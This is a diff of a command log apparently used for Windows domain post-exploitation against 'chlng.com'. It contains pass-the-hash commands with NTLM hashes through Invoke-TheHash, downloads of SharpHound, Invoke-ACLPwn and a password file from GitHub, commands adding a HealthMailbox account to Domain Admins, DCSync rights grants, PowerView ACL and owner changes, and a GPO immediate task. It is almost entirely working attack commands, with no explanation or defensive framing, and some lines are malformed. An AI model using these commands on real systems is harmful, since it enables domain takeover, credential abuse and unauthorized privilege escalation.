@@ -29,25 +29,26 @@ Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6
 Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username Administrator -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -Command \'whoami\' -verbose 
 
 
-powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username Administrator -Hash \'f4b7d0e81f8c34891bf125cba42eb48f\' -Command \'whoami\' -verbose
+powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Command \'whoami\' -verbose
 
-powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Invoke-SMBClient -Domain \'chlng.com\' -Username CHLNG-WKS-1$ -Hash \'86fdb74721e95a00313dc72003155fc8\' -Action List -Source \'\\\\chlng.com\\SYSVOL\' -verbose
+powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Invoke-SMBClient -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Action List -Source \'\\\\chlng.com\\SYSVOL\' -verbose
 
 powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'localhost\' -Domain \'localhost\' -Username Administrator -Hash \'60ba4fcadc466c7a033c178194c03df6\' -Command \'powershell -File C:\\ProgramData\\script.ps1\' -verbose
 
-powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'dc930d98b76baff8b765bff94feed342\' -Command \'C:\\ProgramData\\script.bat\' -verbose
+powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Command \'C:\\ProgramData\\script.bat\' -verbose
 
 powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username CHLNG-WKS-1$ -Hash \'86fdb74721e95a00313dc72003155fc8\' -Command \'' -verbose
 
-powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Command \'^cmd /c ^Powershell C:\\ProgramData\\script.ps1 \^\> C:\\ProgramData\\output30.txt 2^>^&1\' -verbose
+powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Command \'^cmd /c ^C:\\ProgramData\\script.ps1 \^\> C:\\ProgramData\\output30.txt 2^>^&1\' -verbose
 
-powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'af698cc0102abb16bcacbbaa9bce7f9f\' -Command \'^cmd /c ^whoami /all \^\> C:\\ProgramData\\output30.txt 2^>^&1\' -verbose
+powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Command \'^Add-NetGroupUser -UserName HealthMailbox88fa07 -GroupName "domain admins" -Domain "chlng.com" \^\> C:\\ProgramData\\output30.txt 2^>^&1\' -verbose
 
-powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/BloodHoundAD/BloodHound/raw/3.0.0/Ingestors/SharpHound.exe\' -OutFile \'C:\\ProgramData\\SharpHound.exe\'
+powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/3gstudent/Homework-of-Powershell/raw/master/New-GPOImmediateTask.ps1\' -OutFile \'C:\\ProgramData\\New-GPOImmediateTask.ps1\'
 
-powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1\' -OutFile \'C:\\ProgramData\\SharpHound.ps1\'
 
-powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://raw.githubusercontent.com/OreNPluS1/jscript_exchange_webshell/main/Invoke-ACLPwn.ps1\' -OutFile \'C:\\ProgramData\\Invoke-ACLPwn.ps1\'
+powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe\' -OutFile \'C:\\ProgramData\\SharpHound.exe\'
+
+powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://raw.githubusercontent.com/OreNPluS1/jscript_exchange_webshell/main/password.txt\' -OutFile \'C:\\ProgramData\\password.txt\'
 
 powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Add-ADGroupMember -Identity \'Domain Admins\' -Members HealthMailbox88fa07b
 
@@ -60,3 +61,13 @@ powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; echo tes
 powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; $id = [Security.Principal.WindowsIdentity]::GetCurrent(); Add-ADPermission \'chlng.com\' -User $id.Name -ExtendedRights Ds-Replication-Get-Changes,Ds-Replication-Get-Changes-All;
 
 Powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-ADPermission -Identity \'CN=HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9,CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objects,DC=CHLNG,DC=com\' ^| Write-Output 
+
+Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Add-ADPermission \'chlng.com\' -Identity \'CN=HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9,CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objects,DC=CHLNG,DC=com\' -ExtendedRights Ds-Replication-Get-Changes,Ds-Replication-Get-Changes-All;
+
+import-module ^C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PowerSploit\\Recon\\PowerView.ps1
+
+powershell import-module powersploit; import-module C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PowerSploit\\Recon\\PowerView.ps1; Set-DomainObjectOwner -Identity S-1-5-21-2993726475-773441375-2775554650-512 -OwnerIdentity \'HealthMailbox88fa07b\' -Verbose
+
+powershell import-module powersploit; import-module C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PowerSploit\\Recon\\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity HealthMailbox88fa07b -PrincipalIdentity chong -Rights DCSync -Verbose
+
+New-GPOImmediateTask -TaskName Debugging -GPODisplayName SecurePolicy -CommandArguments 'dir C:\\' -Force
